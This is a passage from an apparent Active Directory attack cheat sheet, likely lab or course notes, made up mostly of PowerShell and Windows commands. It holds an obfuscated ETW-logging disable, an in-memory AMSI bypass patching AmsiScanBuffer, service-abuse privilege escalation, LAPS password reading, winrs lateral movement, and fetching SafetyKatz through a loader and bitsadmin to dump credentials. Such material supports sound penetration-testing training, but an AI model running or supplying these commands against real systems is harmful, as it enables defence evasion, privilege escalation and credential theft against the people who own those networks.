      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">Reflection.Assembly</span><span class="p">]::</span><span class="s2">"l</span><span class="se">`o`A</span><span class="s2">dwIThPa</span><span class="se">`R</span><span class="s2">ti</span><span class="se">`A</span><span class="s2">lnamE"</span><span class="p">((</span><span class="s1">'S'</span><span class="o">+</span><span class="s1">'ystem'</span><span class="o">+</span><span class="s1">'.C'</span><span class="o">+</span><span class="s1">'ore'</span><span class="p">))</span><span class="o">.</span><span class="s2">"g</span><span class="se">`E`T</span><span class="s2">TYPE"</span><span class="p">((</span><span class="s1">'Sys'</span><span class="o">+</span><span class="s1">'tem.Di'</span><span class="o">+</span><span class="s1">'agno'</span><span class="o">+</span><span class="s1">'stics.Event'</span><span class="o">+</span><span class="s1">'i'</span><span class="o">+</span><span class="s1">'ng.EventProv'</span><span class="o">+</span><span class="s1">'i'</span><span class="o">+</span><span class="s1">'der'</span><span class="p">))</span><span class="o">.</span><span class="s2">"gET</span><span class="se">`F</span><span class="s2">I</span><span class="se">`e</span><span class="s2">Ld"</span><span class="p">((</span><span class="s1">'m'</span><span class="o">+</span><span class="s1">'_'</span><span class="o">+</span><span class="s1">'enabled'</span><span class="p">),(</span><span class="s1">'NonP'</span><span class="o">+</span><span class="s1">'ubl'</span><span class="o">+</span><span class="s1">'ic'</span><span class="o">+</span><span class="s1">',Instance'</span><span class="p">))</span><span class="o">.</span><span class="s2">"seTVa</span><span class="se">`l`U</span><span class="s2">e"</span><span class="p">([</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="s2">"a</span><span class="se">`s</span><span class="s2">Sem</span><span class="se">`B</span><span class="s2">lY"</span><span class="o">.</span><span class="s2">"gE</span><span class="se">`T`T</span><span class="s2">yPE"</span><span class="p">((</span><span class="s1">'Sys'</span><span class="o">+</span><span class="s1">'tem'</span><span class="o">+</span><span class="s1">'.Mana'</span><span class="o">+</span><span class="s1">'ge'</span><span class="o">+</span><span class="s1">'ment.Aut'</span><span class="o">+</span><span class="s1">'o'</span><span class="o">+</span><span class="s1">'mation.Tracing.'</span><span class="o">+</span><span class="s1">'PSEtwLo'</span><span class="o">+</span><span class="s1">'g'</span><span class="o">+</span><span class="s1">'Pro'</span><span class="o">+</span><span class="s1">'vi'</span><span class="o">+</span><span class="s1">'der'</span><span class="p">))</span><span class="o">.</span><span class="s2">"gEtFIe</span><span class="se">`L</span><span class="s2">d"</span><span class="p">((</span><span class="s1">'e'</span><span class="o">+</span><span class="s1">'twProvid'</span><span class="o">+</span><span class="s1">'er'</span><span class="p">),(</span><span class="s1">'N'</span><span class="o">+</span><span class="s1">'o'</span><span class="o">+</span><span class="s1">'nPu'</span><span class="o">+</span><span class="s1">'b'</span><span class="o">+</span><span class="s1">'lic,Static'</span><span class="p">))</span><span class="o">.</span><span class="s2">"gE</span><span class="se">`T</span><span class="s2">va</span><span class="se">`l</span><span class="s2">Ue"</span><span class="p">(</span><span class="bp">$null</span><span class="p">),</span><span class="mi">0</span><span class="p">)</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>.NET AMSI bypass</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ZQCUW</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sh">@"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string
procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@</span><span class="w">
</span><span class="n">Add-Type</span><span class="w"> </span><span class="nv">$ZQCUW</span><span class="w">
</span><span class="nv">$BBWHVWQ</span><span class="w"> </span><span class="o">=</span><span class="w">
</span><span class="p">[</span><span class="n">ZQCUW</span><span class="p">]::</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s2">"</span><span class="si">$(</span><span class="p">[</span><span class="n">SYstem.Net.wEBUtIlITy</span><span class="p">]::</span><span class="n">HTmldecoDE</span><span class="p">(</span><span class="s1">'&amp;#97;&amp;#109;&amp;#115;&amp;#105;&amp;#46;&amp;#100;&amp;#108;&amp;#108;'</span><span class="si">)</span><span class="s2">)"</span><span class="p">)</span><span class="w">
</span><span class="nv">$XPYMWR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">ZQCUW</span><span class="p">]::</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="nv">$BBWHVWQ</span><span class="p">,</span><span class="w">
</span><span class="s2">"</span><span class="si">$(</span><span class="p">[</span><span class="n">systeM.neT.webUtility</span><span class="p">]::</span><span class="n">HtMldECoDE</span><span class="p">(</span><span class="s1">'&amp;#65;&amp;#109;&amp;#115;&amp;#105;&amp;#83;&amp;#99;&amp;#97;&amp;#110;&amp;#66;&amp;#117;&amp;#102;&amp;#102;&amp;#101;&amp;#114;'</span><span class="si">)</span><span class="s2">)"</span><span class="p">)</span><span class="w">
</span><span class="nv">$p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w">
</span><span class="p">[</span><span class="n">ZQCUW</span><span class="p">]::</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="nv">$XPYMWR</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">uint32</span><span class="p">]</span><span class="mi">5</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="n">x40</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$p</span><span class="p">)</span><span class="w">
</span><span class="nv">$TLML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0xB8"</span><span class="w">
</span><span class="nv">$PURX</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0x57"</span><span class="w">
</span><span class="nv">$YNWL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0x00"</span><span class="w">
</span><span class="nv">$RTGX</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0x07"</span><span class="w">
</span><span class="nv">$XVON</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0x80"</span><span class="w">
</span><span class="nv">$WRUD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0xC3"</span><span class="w">
</span><span class="nv">$KTMJX</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span><span class="w"> </span><span class="p">(</span><span class="nv">$TLML</span><span class="p">,</span><span class="nv">$PURX</span><span class="p">,</span><span class="nv">$YNWL</span><span class="p">,</span><span class="nv">$RTGX</span><span class="p">,</span><span class="o">+</span><span class="nv">$XVON</span><span class="p">,</span><span class="o">+</span><span class="nv">$WRUD</span><span class="p">)</span><span class="w">
</span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">Copy</span><span class="p">(</span><span class="nv">$KTMJX</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$XPYMWR</span><span class="p">,</span><span class="w"> </span><span class="mi">6</span><span class="p">)</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>Enumeration</summary>    
    <div class="content">
      <p> </p>

      <p><strong>AD Module</strong>:
Import:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1</span><span class="w">
</span></code></pre></div>      </div>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADUser</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">samaccountname</span><span class="w">
</span><span class="n">Get-ADComputer</span><span class="w"> </span><span class="err">–</span><span class="nx">Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="err">–</span><span class="nx">expand</span><span class="w"> </span><span class="nx">name</span><span class="w">
</span><span class="n">Get-ADGroup</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Domain Admins'</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w">
</span><span class="n">Get-ADGroup</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">machineadmins</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">Description</span><span class="w">
</span><span class="n">Get-ADGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Domain Admins'</span><span class="w">
</span><span class="n">Get-ADGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Enterprise Admins'</span><span class="w">
</span><span class="n">Get-ADGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Enterprise Admins'</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">domain.local</span><span class="w">
</span><span class="n">Get-ADOrganizationalUnit</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'OU=StudentsMachines,DC=us,DC=domain,DC=local'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nt">-SearchBase</span><span class="w"> </span><span class="bp">$_</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">name</span><span class="w">
</span><span class="n">Get-ACL</span><span class="w"> </span><span class="s1">'AD:\CN=Domain Admins,CN=Users,DC=us,DC=domain,DC=local'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">Access</span><span class="w">
</span><span class="p">(</span><span class="n">Get-ADForest</span><span class="p">)</span><span class="o">.</span><span class="nf">Domains</span><span class="w">
</span><span class="nx">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w">
</span><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s1">'intraForest -ne $True'</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="p">(</span><span class="n">Get-ADForest</span><span class="p">)</span><span class="o">.</span><span class="nf">Name</span><span class="w">
</span><span class="p">(</span><span class="n">Get-ADForest</span><span class="p">)</span><span class="o">.</span><span class="nf">Domains</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s1">'(intraForest -ne $True) -and (ForestTransitive -ne $True)'</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="bp">$_</span><span class="p">}</span><span class="w">
</span><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">domain.local</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Powerview</strong>:
Import</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\PowerView.ps1</span><span class="w">
</span></code></pre></div>      </div>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="n">Get-DomainPolicy</span><span class="p">)</span><span class="o">.</span><span class="nf">KerberosPolicy</span><span class="w">
</span><span class="nx">Get-DomainGPOLocalGroup</span><span class="w">
</span><span class="n">Get-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">group</span><span class="err">&gt;</span><span class="w">
</span><span class="n">Get-DomainOU</span><span class="w">
</span><span class="p">(</span><span class="n">Get-DomainOU</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">OU</span><span class="err">&gt;</span><span class="p">)</span><span class="o">.</span><span class="nf">distinguishedname</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="n">Get-DomainComputer</span><span class="w"> </span><span class="nt">-SearchBase</span><span class="w"> </span><span class="bp">$_</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">name</span><span class="w">
</span><span class="n">Get-DomainGPO</span><span class="w">
</span><span class="p">(</span><span class="n">Get-DomainOU</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">OU</span><span class="err">&gt;</span><span class="p">)</span><span class="o">.</span><span class="nf">gplink</span><span class="w">
</span><span class="nx">Get-DomainGPO</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'{&lt;result of .gplink&gt;}'</span><span class="w">
</span><span class="n">Get-DomainObjectAcl</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Domain Admins"</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="n">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReferenceName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"&lt;user&gt;"</span><span class="p">}</span><span class="w">
</span><span class="n">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReferenceName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"&lt;group&gt;"</span><span class="p">}</span><span class="w">
</span><span class="n">Get-ForestDomain</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-DomainTrust</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">TrustAttributes</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s1">'FILTER_SIDS'</span><span class="p">}</span><span class="w">
</span><span class="n">Get-ForestTrust</span><span class="w"> </span><span class="nt">-Forest</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">forest</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>Powershell Stager</summary>
    <div class="content">
      <p> </p>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="o">.</span><span class="w"> </span><span class="nx">C:\AD\Tools\PowerUp.ps1</span><span class="w">
</span><span class="n">Invoke-AllChecks</span><span class="w">
</span><span class="nx">Invoke-ServiceAbuse</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">ALG</span><span class="w"> </span><span class="nt">-UserName</span><span class="w"> </span><span class="nx">domain\studentuserx</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Same attack with accesschk64 from SysInternals</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="n">\accesschk64.exe</span><span class="w"> </span><span class="nt">-uwcqv</span><span class="w"> </span><span class="s1">'user'</span><span class="w"> </span><span class="o">*</span><span class="w">

</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="nx">ALG</span><span class="w"> </span><span class="nx">binPath</span><span class="o">=</span><span class="w"> </span><span class="s2">"net localgroup administrators domain\user
/add"</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">ALG</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">ALG</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="nx">ALG</span><span class="w"> </span><span class="nx">binPath</span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\WINDOWS\System32\alg.exe"</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">ALG</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">ALG</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Look for local administrative access w/ Powerview</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Find-LocalAdminAccess</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="n">Find-WMILocalAdminAccess.ps1</span><span class="w">
</span><span class="nx">Find-PSRemotingLocalAdminAccess.ps1</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Recursively look for group membership</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">function</span><span class="w"> </span><span class="nf">Get-ADPrincipalGroupMembershipRecursive</span><span class="w"> </span><span class="p">(</span><span class="nv">$SamAccountName</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
  </span><span class="nv">$groups</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="err">Get-ADPrincipalGroupMembership</span><span class="w"> </span><span class="err">-Identity</span><span class="w"> </span><span class="nv">$SamAccountName</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="err">select</span><span class="w"> </span><span class="err">-ExpandProperty</span><span class="w"> </span><span class="err">distinguishedname</span><span class="p">)</span><span class="w"> 
  </span><span class="nv">$groups</span><span class="w">
  </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$groups</span><span class="o">.</span><span class="nf">count</span><span class="w"> </span><span class="o">-gt</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$group</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$groups</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="n">Get-ADPrincipalGroupMembershipRecursive</span><span class="w"> </span><span class="nv">$group</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div>      </div>

      <blockquote>
        <p>ACL entries</p>
      </blockquote>

      <p><strong>Check if any of the groups has interesting ACL entries</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReferenceName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'managers'</span><span class="p">}</span><span class="w">
</span><span class="n">Get-DomainObjectAcl</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">machineadmins</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Add-Member</span><span class="w"> </span><span class="nx">NoteProperty</span><span class="w"> </span><span class="s1">'IdentityName'</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Convert-SidToName</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">SecurityIdentifier</span><span class="p">);</span><span class="bp">$_</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'managers'</span><span class="p">}</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>LAPS</summary>
    <div class="content">

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="n">C:\AD\Tools\Get-LapsPermissions.ps1</span><span class="w">
</span></code></pre></div>      </div>

      <p>With Powerview:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DomainOU</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-DomainObjectAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ObjectAceType</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s1">'ms-Mcs-AdmPwd'</span><span class="p">)</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="p">(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ActiveDirectoryRights</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'ReadProperty'</span><span class="p">)}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Add-Member</span><span class="w"> </span><span class="nx">NoteProperty</span><span class="w"> </span><span class="s1">'IdentityName'</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Convert-SidToName</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">SecurityIdentifier</span><span class="p">);</span><span class="w"> </span><span class="bp">$_</span><span class="p">}</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Read the password</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">ms-mcs-admpwd</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">ms-mcs-admpwd</span><span class="w">
</span><span class="n">Get-AdmPwdPassword</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w">
</span><span class="n">Get-DomainObject</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">ms-mcs-admpwd</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Access the machine with the password</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-u</span><span class="p">:</span><span class="o">.</span><span class="nx">\administrator</span><span class="w"> </span><span class="nt">-p</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">passwd</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="nv">$passwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'&lt;password&gt;'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="nv">$creds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="p">(</span><span class="s2">"&lt;computer&gt;\administrator"</span><span class="p">,</span><span class="w"> </span><span class="nv">$passwd</span><span class="p">)</span><span class="w">
</span><span class="nv">$mailmgmt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$creds</span><span class="w">
</span><span class="nv">$mailmgmt</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>Extract Credentials</summary>
    <div class="content">
      <p> </p>

      <p>winrs:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">winrs</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">x:</span><span class="w"> </span><span class="nx">\\</span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="nx">\C</span><span class="err">$</span><span class="nx">\Users\Public</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="nx">\Administrator</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">password</span><span class="err">&gt;</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\Loader.exe</span><span class="w"> </span><span class="nx">x:\Loader.exe</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">x:</span><span class="w"> </span><span class="nx">/d</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Bypass behaviour detection</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-u</span><span class="p">:</span><span class="o">.</span><span class="nx">\administrator</span><span class="w"> </span><span class="nt">-p</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">password</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">interface</span><span class="w"> </span><span class="nx">portproxy</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">v4tov4</span><span class="w"> </span><span class="nx">listenport</span><span class="o">=</span><span class="mi">8080</span><span class="w"> </span><span class="n">listenaddress</span><span class="o">=</span><span class="mf">0.0</span><span class="o">.</span><span class="nf">0</span><span class="o">.</span><span class="nf">0</span><span class="w"> </span><span class="n">connectport</span><span class="o">=</span><span class="mi">80</span><span class="w"> </span><span class="n">connectaddress</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="nf">100</span><span class="o">.</span><span class="nf">X</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Extract</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\Public\Loader.exe</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">http://127.0.0.1:8080/SafetyKatz.exe</span><span class="w">
</span><span class="n">sekurlsa::keys</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Microsoft signed binary to download NetLoader</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">computer</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-u</span><span class="p">:</span><span class="o">.</span><span class="nx">\administrator</span><span class="w"> </span><span class="nt">-p</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">password</span><span class="err">&gt;</span><span class="w">
</span><span class="s2">"bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\Users\\Public\\Loader.exe"</span><span class="w">
</span></code></pre></div>      </div>

